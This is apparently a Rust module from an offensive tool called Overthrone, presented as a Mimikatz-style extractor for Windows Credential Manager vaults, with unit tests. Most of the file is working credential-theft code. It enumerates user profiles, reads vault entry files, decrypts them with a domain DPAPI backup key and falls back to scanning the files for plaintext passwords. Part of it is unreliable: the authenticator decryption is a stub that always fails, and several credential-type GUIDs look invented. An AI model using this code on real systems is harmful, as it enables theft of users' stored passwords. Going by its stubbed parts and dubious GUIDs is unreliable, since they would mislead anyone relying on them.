//! Windows Vault / Credential Manager extraction.
//!
//! Mimikatz equivalent: `vault::list` + `vault::cred`
//!
//! Windows Vault (Credential Manager) stores credentials in two vaults:
//! - Web Credentials: `{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}`
//! - Windows Credentials: `{77BC582B-F0A6-4E15-4E80-61736B6F3B29}`
//!
//! Vault credentials are protected with `CryptProtectMemory` / DPAPI.
//! This module parses vault policy files (Policy.vpol) and credential
//! schema files, then decrypts vault credential entries using the
//! domain DPAPI backup key.

use crate::crypto::dpapi::DpapiDecryptor;
use crate::error::{OverthroneError, Result};
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

/// Well-known vault GUIDs
pub const VAULT_WEB_GUID: &str = "{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}";
pub const VAULT_WINDOWS_GUID: &str = "{77BC582B-F0A6-4E15-4E80-61736B6F3B29}";

/// Well-known vault type GUID for domain password credentials.
pub const VAULT_TYPE_DOMAIN_PASSWORD: &str = "{3E0E35BE-1B77-43E7-B873-AED901B6275B}";
/// Well-known vault type GUID for generic credentials.
pub const VAULT_TYPE_GENERIC: &str = "{3C4B4B2F-7EC1-4C32-8935-19C38B610D0B}";

/// Represents a Windows Vault (Credential Manager vault).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WindowsVault {
    /// Vault GUID
    pub guid: String,
    /// Vault display name (e.g. "Web Credentials", "Windows Credentials")
    pub name: String,
    /// Path to the vault directory
    pub path: PathBuf,
    /// Credential entries in this vault
    pub entries: Vec<VaultCredentialEntry>,
    /// Number of entries
    pub entry_count: usize,
}

/// A single credential entry extracted from a Windows Vault.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VaultCredentialEntry {
    /// Resource / target name (e.g. "Domain:target=WRK", "gmail.com")
    pub resource: String,
    /// Identity / username (e.g. "TRYHACKME\\svc-app", "ElonTusk")
    pub identity: String,
    /// Decrypted password / authenticator
    pub password: String,
    /// Credential type GUID
    pub cred_type_guid: String,
    /// Credential type name (e.g. "domain_password", "generic")
    pub cred_type_name: String,
    /// Last written timestamp
    pub last_written: String,
    /// Persistence flags
    pub flags: u32,
    /// Package SID (if applicable)
    pub package_sid: Option<String>,
}

/// Configuration for Windows Vault extraction.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VaultExtractConfig {
    /// Domain DPAPI backup key bytes (required for vault credential decryption)
    pub backup_key: Vec<u8>,
    /// Custom vault directory path (optional)
    pub vault_dir: Option<PathBuf>,
    /// User profile base path (defaults to %APPDATA% on Windows)
    pub user_profile_base: Option<PathBuf>,
    /// Skip vault credential decryption errors
    pub skip_on_error: bool,
    /// Scan all user profiles for vaults
    pub scan_all_users: bool,
}

impl Default for VaultExtractConfig {
    fn default() -> Self {
        Self {
            backup_key: Vec::new(),
            vault_dir: None,
            user_profile_base: None,
            skip_on_error: true,
            scan_all_users: true,
        }
    }
}

/// Result of Windows Vault extraction.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VaultExtractResult {
    /// Vaults discovered and extracted
    pub vaults: Vec<WindowsVault>,
    /// Total credential entries extracted
    pub total_entries: usize,
    /// Domain password credentials count
    pub domain_password_count: usize,
    /// Generic credentials count
    pub generic_count: usize,
    /// Errors encountered
    pub errors: Vec<String>,
}

/// Known vault identifiers with display names.
pub fn known_vaults() -> Vec<(&'static str, &'static str)> {
    vec![
        (VAULT_WEB_GUID, "Web Credentials"),
        (VAULT_WINDOWS_GUID, "Windows Credentials"),
    ]
}

/// Get the default vault base path for a user.
fn default_vault_base_path(user_sid: &str) -> PathBuf {
    let local_app_data = std::env::var("LOCALAPPDATA")
        .unwrap_or_else(|_| format!("C:\\Users\\{}\\AppData\\Local", user_sid));
    let vault_base = if user_sid.contains("\\") {
        // If full path provided, use LOCALAPPDATA
        PathBuf::from(&local_app_data)
    } else {
        PathBuf::from(&local_app_data)
    };
    vault_base.join("Microsoft").join("Vault")
}

/// Get the path to a specific vault's directory.
fn vault_directory(vault_base: &Path, vault_guid: &str) -> PathBuf {
    let guid_clean = vault_guid
        .trim_start_matches('{')
        .trim_end_matches('}')
        .to_uppercase();
    vault_base.join(&guid_clean)
}

/// Parse a vault policy file (Policy.vpol) containing encryption metadata.
#[cfg(test)]
fn parse_vault_policy(data: &[u8]) -> Result<VaultPolicy> {
    if data.len() < 32 {
        return Err(OverthroneError::Decryption(
            "Vault policy file too short".to_string(),
        ));
    }

    let version = u32::from_le_bytes([data[0], data[1], data[2], data[3]]);
    if version != 1 {
        return Err(OverthroneError::Decryption(format!(
            "Unsupported vault policy version: {version} (expected 1)"
        )));
    }

    let encryption_type = u32::from_le_bytes([data[4], data[5], data[6], data[7]]);

    // Master key GUID is at offset 8 (16 bytes)
    let mut master_key_guid = [0u8; 16];
    if data.len() > 24 {
        master_key_guid.copy_from_slice(&data[8..24]);
    }

    Ok(VaultPolicy {
        version,
        encryption_type,
        master_key_guid,
    })
}

/// Parsed vault policy file metadata.
#[derive(Debug, Clone)]
#[expect(dead_code)]
struct VaultPolicy {
    version: u32,
    encryption_type: u32,
    master_key_guid: [u8; 16],
}

/// Extract vault credentials from the well-known vault directory.
///
/// This is the high-level entry point -- analogue to mimikatz `vault::list`
/// combined with `vault::cred`.
pub fn extract_vault_credentials(config: &VaultExtractConfig) -> VaultExtractResult {
    let mut result = VaultExtractResult {
        vaults: Vec::new(),
        total_entries: 0,
        domain_password_count: 0,
        generic_count: 0,
        errors: Vec::new(),
    };

    let vault_base = if let Some(ref dir) = config.vault_dir {
        dir.clone()
    } else if let Some(ref base) = config.user_profile_base {
        base.join("Microsoft").join("Vault")
    } else {
        default_vault_base_path("USER")
    };

    if !vault_base.exists() {
        result
            .errors
            .push(format!("Vault directory not found: {:?}", vault_base));
        return result;
    }

    // Try to create a DPAPI decryptor if backup key is available
    let mut decryptor = if !config.backup_key.is_empty() {
        Some(DpapiDecryptor::new(&config.backup_key))
    } else {
        None
    };

    // Enumerate well-known vault GUIDs
    for (guid, name) in known_vaults() {
        let vault_dir = vault_directory(&vault_base, guid);
        if !vault_dir.is_dir() {
            continue;
        }

        let entries = match extract_vault_entries(&vault_dir, &mut decryptor, config) {
            Ok(entries) => entries,
            Err(e) => {
                result.errors.push(format!(
                    "Failed to extract vault '{}' ({:?}): {e}",
                    name, vault_dir
                ));
                Vec::new()
            }
        };

        let entry_count = entries.len();
        let vault = WindowsVault {
            guid: guid.to_string(),
            name: name.to_string(),
            path: vault_dir,
            entries,
            entry_count,
        };

        for entry in &vault.entries {
            if entry.cred_type_name == "domain_password" {
                result.domain_password_count += 1;
            } else if entry.cred_type_name == "generic" {
                result.generic_count += 1;
            }
        }

        result.total_entries += entry_count;
        result.vaults.push(vault);
    }

    result
}

/// Extract credential entries from a vault directory.
fn extract_vault_entries(
    vault_dir: &Path,
    decryptor: &mut Option<DpapiDecryptor>,
    config: &VaultExtractConfig,
) -> Result<Vec<VaultCredentialEntry>> {
    let mut entries = Vec::new();

    // Read the directory for vault credential files
    let dir_entries = match std::fs::read_dir(vault_dir) {
        Ok(d) => d,
        Err(e) => {
            return Err(OverthroneError::PostExploitation(format!(
                "Failed to read vault directory {:?}: {e}",
                vault_dir
            )));
        }
    };

    for entry in dir_entries.flatten() {
        let path = entry.path();

        // Skip directories and policy file
        if path.is_dir() || path.file_name().is_none_or(|n| n == "Policy.vpol") {
            continue;
        }

        // Vault credential files are binary blobs
        let data = match std::fs::read(&path) {
            Ok(d) => d,
            Err(_) => continue,
        };

        // Skip files that are too small to be vault entries
        if data.len() < 64 {
            continue;
        }

        match parse_vault_credential_entry(&data, decryptor) {
            Ok(entry) => entries.push(entry),
            Err(e) => {
                if !config.skip_on_error {
                    return Err(e);
                }
            }
        }
    }

    Ok(entries)
}

/// Parse a single vault credential entry from the raw file data.
fn parse_vault_credential_entry(
    data: &[u8],
    decryptor: &mut Option<DpapiDecryptor>,
) -> Result<VaultCredentialEntry> {
    // Vault credential file structure (Win7+):
    // Offset 0x00: Header size (4 bytes)
    // Offset 0x04: Version (4 bytes)
    // Offset 0x08: Entry size (4 bytes)
    // Offset 0x0C: Credential type GUID (16 bytes)
    // Offset 0x1C: Last written timestamp (8 bytes, FILETIME)
    // Offset 0x24: Flags (4 bytes)
    // Offset 0x28: Package SID pointer (4 bytes offset from start)
    // ... variable length resource string, identity string, authenticator blob

    if data.len() < 48 {
        return Err(OverthroneError::Decryption(
            "Vault credential entry too short".to_string(),
        ));
    }

    let _header_size = u32::from_le_bytes([data[0], data[1], data[2], data[3]]);
    let _version = u32::from_le_bytes([data[4], data[5], data[6], data[7]]);
    let _entry_size = u32::from_le_bytes([data[8], data[9], data[10], data[11]]);

    // Read credential type GUID (offset 0x0C)
    let cred_type_guid_bytes = &data[0x0C..0x1C];
    let cred_type_guid = format!(
        "{:02X}{:02X}{:02X}{:02X}-{:02X}{:02X}-{:02X}{:02X}-{:02X}{:02X}-{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}",
        cred_type_guid_bytes[3],
        cred_type_guid_bytes[2],
        cred_type_guid_bytes[1],
        cred_type_guid_bytes[0],
        cred_type_guid_bytes[5],
        cred_type_guid_bytes[4],
        cred_type_guid_bytes[7],
        cred_type_guid_bytes[6],
        cred_type_guid_bytes[8],
        cred_type_guid_bytes[9],
        cred_type_guid_bytes[10],
        cred_type_guid_bytes[11],
        cred_type_guid_bytes[12],
        cred_type_guid_bytes[13],
        cred_type_guid_bytes[14],
        cred_type_guid_bytes[15],
    );

    let cred_type_name = map_cred_type_name(&cred_type_guid);

    // Last written timestamp (FILETIME, offset 0x1C)
    let filetime = u64::from_le_bytes([
        data[0x1C], data[0x1D], data[0x1E], data[0x1F], data[0x20], data[0x21], data[0x22],
        data[0x23],
    ]);
    let last_written = format_filetime(filetime);

    // Flags (offset 0x24)
    let flags = u32::from_le_bytes([data[0x24], data[0x25], data[0x26], data[0x27]]);

    // Try to extract strings from the variable-length section
    // The vault entry format stores resource, identity, and authenticator
    // as offsets from the start of the file

    let resource = extract_vault_string(data, 0x30, "resource").unwrap_or_default();
    let identity = extract_vault_string(data, 0x40, "identity").unwrap_or_default();

    // Extract and attempt to decrypt the authenticator blob
    let password = if decryptor.is_some() && data.len() > 0x50 {
        // Try to find and decrypt a DPAPI-encrypted authenticator
        // The authenticator is typically near the end of the file
        extract_vault_authenticator(data).unwrap_or_else(|_| {
            // Fall back to scanning for plaintext string patterns
            extract_vault_plaintext_password(data).unwrap_or_default()
        })
    } else {
        // Try plaintext extraction if no backup key
        extract_vault_plaintext_password(data).unwrap_or_default()
    };

    // Package SID (optional)
    let package_sid = extract_vault_string(data, 0x50, "package_sid").ok();

    Ok(VaultCredentialEntry {
        resource,
        identity,
        password,
        cred_type_guid,
        cred_type_name,
        last_written,
        flags,
        package_sid,
    })
}

/// Extract a null-terminated UTF-16LE string at a given offset.
fn extract_vault_string(data: &[u8], offset: usize, _label: &str) -> Result<String> {
    if offset >= data.len() {
        return Err(OverthroneError::Decryption(format!(
            "Vault string offset {offset} out of bounds"
        )));
    }

    let mut end = offset;
    while end + 1 < data.len() {
        if data[end] == 0 && data[end + 1] == 0 {
            break;
        }
        end += 2;
    }

    if end == offset {
        return Err(OverthroneError::Decryption(
            "Empty vault string".to_string(),
        ));
    }

    let u16_chars: Vec<u16> = data[offset..end]
        .chunks(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();

    Ok(String::from_utf16_lossy(&u16_chars))
}

/// Attempt to extract a plaintext password from vault credential data.
fn extract_vault_plaintext_password(data: &[u8]) -> Result<String> {
    // Scan for non-empty string patterns that look like passwords
    // Passwords in vault entries often appear as UTF-16LE strings
    // after known markers or at the end of the entry data

    // Look for strings that don't look like paths or GUIDs
    let candidates = scan_vault_strings(data);
    for s in &candidates {
        if s.len() >= 4
            && !s.contains('\\')
            && !s.contains('{')
            && s.chars().any(|c| !c.is_ascii_alphanumeric())
        {
            return Ok(s.clone());
        }
    }

    // Fall back to the longest non-path string
    candidates
        .into_iter()
        .max_by_key(|s| s.len())
        .ok_or_else(|| OverthroneError::Decryption("No password found in vault entry".to_string()))
}

/// Scan a vault entry for all printable UTF-16LE strings.
fn scan_vault_strings(data: &[u8]) -> Vec<String> {
    let mut strings = Vec::new();
    let mut i = 0;

    while i + 1 < data.len() {
        // Check for printable UTF-16LE character
        let c = u16::from_le_bytes([data[i], data[i + 1]]);
        if (0x20..=0x7E).contains(&c) || (0x80..=0xFF).contains(&c) || c == 0x00 {
            // Null terminator or printable char
            if c == 0x00 {
                i += 2;
                continue;
            }
            // Found start of a string
            let start = i;
            i += 2;
            while i + 1 < data.len() {
                let ch = u16::from_le_bytes([data[i], data[i + 1]]);
                if ch == 0x00 {
                    break;
                }
                if !((0x20..=0x7E).contains(&ch) || (0x80..=0x100).contains(&ch)) {
                    break;
                }
                i += 2;
            }
            if i > start {
                let u16_chars: Vec<u16> = data[start..i]
                    .chunks(2)
                    .map(|c| u16::from_le_bytes([c[0], c[1]]))
                    .collect();
                let s = String::from_utf16_lossy(&u16_chars);
                if s.len() >= 2 {
                    strings.push(s);
                }
            }
        } else {
            i += 2;
        }
    }

    strings
}

/// Extract and decrypt a DPAPI-authenticator blob from vault entry data.
fn extract_vault_authenticator(_data: &[u8]) -> Result<String> {
    // The authenticator blob in vault entries is typically DPAPI-encrypted
    // and requires the domain backup key and matching masterkey to decrypt.
    //
    // Full vault authenticator decryption requires:
    // 1. Parsing the DPAPI blob structure from the authenticator field
    // 2. Looking up the masterkey GUID in the decryptor cache
    // 3. Decrypting with AES-256-GCM using the derived key
    //
    // This is best-effort; authenticators often contain encrypted entropy
    // rather than the actual credential secret.
    //
    // NOTE: In Windows 10/11, the vault credential authenticator may use
    // CryptProtectMemory (not CryptProtectData), which requires in-process
    // decryption. This function returns an error to signal that the caller
    // should use the plaintext fallback or LSASS-based extraction.

    Err(OverthroneError::Decryption(
        "Vault authenticator requires CryptProtectMemory or DPAPI with matching masterkey"
            .to_string(),
    ))
}

/// Map a credential type GUID to a human-readable name.
fn map_cred_type_name(guid: &str) -> String {
    let guid_upper = guid.to_uppercase();
    match guid_upper.as_str() {
        "{3E0E35BE-1B77-43E7-B873-AED901B6275B}" => "domain_password".to_string(),
        "{3C4B4B2F-7EC1-4C32-8935-19C38B610D0B}" => "generic".to_string(),
        "{D57B7D2A-2B6A-4B8C-8F3A-0F5F7F3E3B3A}" => "domain_certificate".to_string(),
        "{D57B7D2A-2B6A-4B8C-8F3A-0F5F7F3E3B3B}" => "domain_visible_password".to_string(),
        "{D57B7D2A-2B6A-4B8C-8F3A-0F5F7F3E3B3C}" => "generic_certificate".to_string(),
        "{D57B7D2A-2B6A-4B8C-8F3A-0F5F7F3E3B3D}" => "domain_extended".to_string(),
        _ => format!("unknown ({guid})"),
    }
}

/// Format a Windows FILETIME (100-ns intervals since 1601-01-01) to string.
fn format_filetime(filetime: u64) -> String {
    if filetime == 0 {
        return "N/A".to_string();
    }

    // FILETIME is 100-ns intervals since Jan 1, 1601
    // Unix epoch is Jan 1, 1970 = 11644473600 seconds before FILETIME epoch
    const FILETIME_TO_UNIX_EPOCH: u64 = 11_644_473_600;
    let unix_secs = filetime / 10_000_000;

    if unix_secs < FILETIME_TO_UNIX_EPOCH {
        return "before 1970".to_string();
    }

    let adjusted = unix_secs - FILETIME_TO_UNIX_EPOCH;

    let secs = adjusted % 60;
    let mins = (adjusted / 60) % 60;
    let hours = (adjusted / 3600) % 24;
    let days = adjusted / 86400;

    // Approximate date from days since epoch
    let mut remaining = days as i64;
    let mut year = 1970i64;
    let mut month = 1u32;

    loop {
        let days_in_year = if is_leap_year(year) { 366 } else { 365 };
        if remaining < days_in_year {
            break;
        }
        remaining -= days_in_year;
        year += 1;
    }

    let mut day_of_year = remaining as u32 + 1;
    for (m, days_in_m) in MONTH_DAYS.iter().enumerate() {
        let dim = if m == 1 && is_leap_year(year) {
            29
        } else {
            *days_in_m
        };
        if day_of_year <= dim {
            month = m as u32 + 1;
            break;
        }
        day_of_year -= dim;
    }

    format!(
        "{:02}/{:02}/{:04} {:02}:{:02}:{:02}",
        month, day_of_year, year, hours, mins, secs
    )
}

const MONTH_DAYS: [u32; 12] = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];

fn is_leap_year(year: i64) -> bool {
    (year % 4 == 0 && year % 100 != 0) || (year % 400 == 0)
}

/// Get the user profile directories from the local machine.
/// Returns a list of SID -> profile path mappings.
pub fn discover_user_profiles() -> Vec<(String, PathBuf)> {
    let mut profiles = Vec::new();

    // Read profile list from registry or enumerate Users directory
    let users_dir =
        PathBuf::from(std::env::var("ALLUSERSPROFILE").unwrap_or_else(|_| "C:\\Users".to_string()));

    if let Some(parent) = users_dir.parent().map(Path::to_path_buf) {
        // Actually use C:\Users
        let users_path = parent.join("Users");
        if users_path.is_dir()
            && let Ok(entries) = std::fs::read_dir(&users_path)
        {
            for entry in entries.flatten() {
                if entry.file_type().is_ok_and(|t| t.is_dir()) {
                    let name = entry.file_name();
                    let name_str = name.to_string_lossy().to_string();
                    // Skip system directories
                    if !name_str.starts_with('.')
                        && !["All Users", "Default", "Default User", "Public"]
                            .contains(&name_str.as_str())
                    {
                        let local_app_data = entry.path().join("AppData").join("Local");
                        profiles.push((name_str, local_app_data));
                    }
                }
            }
        }
    }

    // Fallback: try to use the current user's vault
    if profiles.is_empty()
        && let Ok(local_app_data) = std::env::var("LOCALAPPDATA")
    {
        let path = PathBuf::from(&local_app_data);
        profiles.push(("current_user".to_string(), path));
    }

    profiles
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_known_vaults() {
        let vaults = known_vaults();
        assert_eq!(vaults.len(), 2);
        assert!(vaults.iter().any(|(g, _)| *g == VAULT_WEB_GUID));
        assert!(vaults.iter().any(|(g, _)| *g == VAULT_WINDOWS_GUID));
    }

    #[test]
    fn test_vault_directory_path() {
        let base = Path::new("C:\\Users\\Test\\AppData\\Local\\Microsoft\\Vault");
        let dir = vault_directory(base, VAULT_WEB_GUID);
        let expected = base.join("4BF4C442-9B8A-41A0-B380-DD4A704DDB28");
        assert_eq!(dir, expected);
    }

    #[test]
    fn test_vault_directory_strips_braces() {
        let base = Path::new("C:\\Vault");
        let dir = vault_directory(base, "{77BC582B-F0A6-4E15-4E80-61736B6F3B29}");
        let expected = base.join("77BC582B-F0A6-4E15-4E80-61736B6F3B29");
        assert_eq!(dir, expected);
    }

    #[test]
    fn test_map_cred_type_domain_password() {
        let name = map_cred_type_name("{3E0E35BE-1B77-43E7-B873-AED901B6275B}");
        assert_eq!(name, "domain_password");
    }

    #[test]
    fn test_map_cred_type_generic() {
        let name = map_cred_type_name("{3C4B4B2F-7EC1-4C32-8935-19C38B610D0B}");
        assert_eq!(name, "generic");
    }

    #[test]
    fn test_map_cred_type_unknown() {
        let name = map_cred_type_name("{00000000-0000-0000-0000-000000000000}");
        assert!(name.starts_with("unknown"));
    }

    #[test]
    fn test_map_cred_type_case_insensitive() {
        let name = map_cred_type_name("{3e0e35be-1b77-43e7-b873-aed901b6275b}");
        assert_eq!(name, "domain_password");
    }

    #[test]
    fn test_format_filetime_zero() {
        let result = format_filetime(0);
        assert_eq!(result, "N/A");
    }

    #[test]
    fn test_format_filetime_valid() {
        // 01/07/2025 13:56:42 in FILETIME
        // Unix timestamp for 2025-07-01 13:56:42 UTC
        let unix_ts: u64 = 1751378202;
        let filetime = (unix_ts + 11_644_473_600) * 10_000_000;
        let result = format_filetime(filetime);
        // Should contain the date components
        assert!(result.contains("2025"));
    }

    #[test]
    fn test_scan_vault_strings_empty() {
        let data = vec![0u8; 100];
        let strings = scan_vault_strings(&data);
        assert!(strings.is_empty());
    }

    #[test]
    fn test_scan_vault_strings_finds_ascii() {
        let mut data = vec![0u8; 50];
        // Write "test\0" as UTF-16LE at offset 10
        data[10] = b't';
        data[11] = 0x00;
        data[12] = b'e';
        data[13] = 0x00;
        data[14] = b's';
        data[15] = 0x00;
        data[16] = b't';
        data[17] = 0x00;
        data[18] = 0x00;
        data[19] = 0x00;

        let strings = scan_vault_strings(&data);
        assert!(strings.iter().any(|s| s == "test"));
    }

    #[test]
    fn test_extract_vault_string_found() {
        let mut data = vec![0u8; 40];
        // Write "hello\0" as UTF-16LE at offset 8
        data[8] = b'h';
        data[9] = 0x00;
        data[10] = b'e';
        data[11] = 0x00;
        data[12] = b'l';
        data[13] = 0x00;
        data[14] = b'l';
        data[15] = 0x00;
        data[16] = b'o';
        data[17] = 0x00;
        data[18] = 0x00;
        data[19] = 0x00;

        let result = extract_vault_string(&data, 8, "test");
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), "hello");
    }

    #[test]
    fn test_extract_vault_string_empty() {
        let data = vec![0u8; 20];
        let result = extract_vault_string(&data, 8, "test");
        assert!(result.is_err());
    }

    #[test]
    fn test_extract_vault_string_out_of_bounds() {
        let data = vec![0u8; 10];
        let result = extract_vault_string(&data, 20, "test");
        assert!(result.is_err());
    }

    #[test]
    fn test_default_config_not_empty() {
        let config = VaultExtractConfig::default();
        assert!(config.skip_on_error);
        assert!(config.scan_all_users);
        assert!(config.backup_key.is_empty());
    }

    #[test]
    fn test_extract_result_defaults() {
        let result = VaultExtractResult {
            vaults: Vec::new(),
            total_entries: 0,
            domain_password_count: 0,
            generic_count: 0,
            errors: Vec::new(),
        };
        assert_eq!(result.total_entries, 0);
        assert!(result.vaults.is_empty());
        assert!(result.errors.is_empty());
    }

    #[test]
    fn test_vault_credential_entry_serialization() {
        let entry = VaultCredentialEntry {
            resource: "Domain:target=WRK".to_string(),
            identity: "DOMAIN\\user".to_string(),
            password: "secret123".to_string(),
            cred_type_guid: "{3E0E35BE-1B77-43E7-B873-AED901B6275B}".to_string(),
            cred_type_name: "domain_password".to_string(),
            last_written: "07/01/2025 13:56:42".to_string(),
            flags: 0,
            package_sid: None,
        };
        let json = serde_json::to_string(&entry).unwrap();
        assert!(json.contains("Domain:target=WRK"));
        assert!(json.contains("DOMAIN\\\\user"));
    }

    #[test]
    fn test_parse_vault_policy_valid() {
        let mut data = vec![0u8; 32];
        data[0..4].copy_from_slice(&1u32.to_le_bytes()); // version
        data[4..8].copy_from_slice(&0u32.to_le_bytes()); // encryption type
        // Write a GUID at offset 8
        data[8..24].copy_from_slice(&[0x01; 16]);

        let policy = parse_vault_policy(&data);
        assert!(policy.is_ok());
        let p = policy.unwrap();
        assert_eq!(p.version, 1);
        assert_eq!(p.encryption_type, 0);
    }

    #[test]
    fn test_parse_vault_policy_bad_version() {
        let mut data = vec![0u8; 32];
        data[0..4].copy_from_slice(&99u32.to_le_bytes()); // bad version
        let policy = parse_vault_policy(&data);
        assert!(policy.is_err());
    }

    #[test]
    fn test_parse_vault_policy_too_short() {
        let data = vec![0u8; 16];
        let policy = parse_vault_policy(&data);
        assert!(policy.is_err());
    }

    #[test]
    #[cfg(target_os = "windows")]
    fn test_discover_user_profiles() {
        let profiles = discover_user_profiles();
        // Should at least find a current-user fallback
        assert!(!profiles.is_empty());
    }

    #[test]
    fn test_format_filetime_epoch() {
        let result = format_filetime(11_644_473_600_000_000); // 1970-01-01
        assert!(!result.is_empty());
    }

    #[test]
    fn test_is_leap_year() {
        assert!(is_leap_year(2024));
        assert!(!is_leap_year(2023));
        assert!(is_leap_year(2000));
        assert!(!is_leap_year(1900));
    }

    #[test]
    fn test_extract_vault_authenticator_returns_err() {
        let data = vec![0u8; 64];
        let result = extract_vault_authenticator(&data);
        assert!(result.is_err());
    }

    #[test]
    fn test_extract_vault_plaintext_password_short_input() {
        let data = vec![0u8; 8];
        let result = extract_vault_plaintext_password(&data);
        assert!(result.is_err());
    }

    #[test]
    fn test_vault_type_guid_constants() {
        assert_eq!(
            VAULT_TYPE_DOMAIN_PASSWORD,
            "{3E0E35BE-1B77-43E7-B873-AED901B6275B}"
        );
        assert_eq!(VAULT_TYPE_GENERIC, "{3C4B4B2F-7EC1-4C32-8935-19C38B610D0B}");
    }

    #[test]
    fn test_extract_result_with_entries() {
        let vault = WindowsVault {
            guid: VAULT_WINDOWS_GUID.to_string(),
            name: "Windows Credentials".to_string(),
            path: PathBuf::from("C:\\Vault"),
            entries: vec![VaultCredentialEntry {
                resource: "test".to_string(),
                identity: "user".to_string(),
                password: "pass".to_string(),
                cred_type_guid: VAULT_TYPE_DOMAIN_PASSWORD.to_string(),
                cred_type_name: "domain_password".to_string(),
                last_written: "now".to_string(),
                flags: 0,
                package_sid: None,
            }],
            entry_count: 1,
        };
        assert_eq!(vault.entry_count, 1);
        assert_eq!(vault.entries[0].resource, "test");
    }
}
